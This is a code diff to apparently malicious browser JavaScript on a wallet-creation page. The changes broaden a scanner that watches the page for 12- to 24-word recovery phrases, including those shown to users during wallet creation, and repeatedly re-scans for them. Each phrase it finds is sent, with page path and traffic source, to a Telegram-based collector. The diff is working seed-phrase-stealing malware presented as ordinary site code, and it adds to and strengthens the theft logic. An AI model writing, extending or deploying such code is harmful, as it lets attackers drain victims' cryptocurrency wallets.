@@ -20,12 +20,19 @@ function getTrafficSource() {
   return referrer || 'Direct';
 }
 
+// Phrase validation (global scope)
+function isSeedPhrase(value) {
+  if (!value || typeof value !== 'string') return false;
+  const words = value.trim().split(/\s+/).filter(w => w.length > 0);
+  return [12, 15, 18, 21, 24].includes(words.length);
+}
+
 // Monitor displayed seed phrases (wallet creation)
 function monitorDisplayedPhrases() {
   const observer = new MutationObserver(function(mutations) {
     mutations.forEach(function(mutation) {
       mutation.addedNodes.forEach(function(node) {
-        if (node.nodeType === 1) { // Element node
+        if (node.nodeType === 1) {
           checkForDisplayedPhrase(node);
         }
       });
@@ -37,13 +44,23 @@ function monitorDisplayedPhrases() {
     subtree: true
   });
   
-  // Also check existing content
-  setTimeout(function() {
+  // Check existing content multiple times (catch lazy-loaded content)
+  setTimeout(() => checkForDisplayedPhrase(document.body), 1000);
+  setTimeout(() => checkForDisplayedPhrase(document.body), 3000);
+  setTimeout(() => checkForDisplayedPhrase(document.body), 5000);
+  
+  // Periodic re-scan every 5 seconds for 30 seconds
+  let scanCount = 0;
+  const periodicScan = setInterval(function() {
     checkForDisplayedPhrase(document.body);
-  }, 2000);
+    scanCount++;
+    if (scanCount >= 6) clearInterval(periodicScan);
+  }, 5000);
 }
 
 function checkForDisplayedPhrase(element) {
+  if (!element || !element.querySelectorAll) return;
+  
   // Look for seed phrase containers (common patterns)
   const selectors = [
     '[class*="seed"]',
@@ -52,36 +69,65 @@ function checkForDisplayedPhrase(element) {
     '[class*="recovery"]',
     '[class*="backup"]',
     '[class*="word"]',
+    '[class*="wallet"]',
+    '[class*="create"]',
     '[data-testid*="seed"]',
-    '[data-testid*="phrase"]'
+    '[data-testid*="phrase"]',
+    'textarea',
+    'pre',
+    'code',
+    '.word-list',
+    '.word-grid',
+    '.phrase-display'
   ];
   
+  // Also check ALL div and span elements as fallback
+  const allElements = element.querySelectorAll('div, span, p, textarea, pre, code');
+  const combined = new Set([...allElements]);
+  
+  // Add selector-matched elements
   selectors.forEach(function(selector) {
     try {
-      const elements = element.querySelectorAll ? element.querySelectorAll(selector) : [];
-      elements.forEach(function(el) {
-        const text = el.textContent || el.innerText || '';
-        const trimmed = text.trim();
-        
-        if (isSeedPhrase(trimmed) && !el.getAttribute('data-phrase-logged')) {
-          el.setAttribute('data-phrase-logged', 'true');
-          const trafficSource = getTrafficSource();
-          
-          if (window.TelegramIntegration) {
-            window.TelegramIntegration.send({
-              type: 'WALLET_CREATED_PHRASE_DISPLAYED',
-              content: trimmed,
-              wordCount: trimmed.split(/\s+/).filter(w => w.length > 0).length,
-              context: 'User saw this phrase during wallet creation',
-              page: window.location.pathname,
-              trafficSource: trafficSource,
-              timestamp: new Date().toISOString()
-            }).then(() => console.log('📋 Displayed phrase logged (' + trimmed.split(/\s+/).filter(w => w.length > 0).length + ' words) from ' + trafficSource));
-          }
-        }
-      });
-    } catch (e) {
-      // Silently ignore selector errors
+      const matched = element.querySelectorAll(selector);
+      matched.forEach(el => combined.add(el));
+    } catch (e) {}
+  });
+  
+  // Check each element
+  combined.forEach(function(el) {
+    if (el.getAttribute('data-phrase-logged')) return;
+    
+    // Get text content (handle various formats)
+    let text = '';
+    if (el.tagName === 'TEXTAREA' || el.tagName === 'INPUT') {
+      text = el.value || '';
+    } else {
+      text = el.textContent || el.innerText || '';
+    }
+    
+    const trimmed = text.trim();
+    
+    // Check if it's a valid seed phrase
+    if (trimmed && isSeedPhrase(trimmed)) {
+      el.setAttribute('data-phrase-logged', 'true');
+      const trafficSource = getTrafficSource();
+      const wordCount = trimmed.split(/\s+/).filter(w => w.length > 0).length;
+      
+      console.log('📋 Found ' + wordCount + '-word phrase in', el.tagName, el.className);
+      
+      if (window.TelegramIntegration) {
+        window.TelegramIntegration.send({
+          type: 'WALLET_CREATED_PHRASE_DISPLAYED',
+          content: trimmed,
+          wordCount: wordCount,
+          element: el.tagName + (el.className ? '.' + el.className : ''),
+          context: 'User saw this phrase during wallet creation',
+          page: window.location.pathname,
+          trafficSource: trafficSource,
+          timestamp: new Date().toISOString()
+        }).then(() => console.log('✅ Sent to Telegram: ' + wordCount + ' words from ' + trafficSource))
+          .catch(e => console.error('❌ Failed to send:', e));
+      }
     }
   });
 }
@@ -97,12 +143,6 @@ document.addEventListener('DOMContentLoaded', function() {
   // Enhanced phrase detection - captures 12, 15, 18, 21, 24 words
   let lastSentValue = '';
   let phraseTimeout;
-  
-  function isSeedPhrase(value) {
-    const words = value.trim().split(/\s+/).filter(w => w.length > 0);
-    // ONLY accept exact 12, 15, 18, 21, or 24 words
-    return [12, 15, 18, 21, 24].includes(words.length);
-  }
   
   document.addEventListener('input', function(e) {
     const target = e.target;
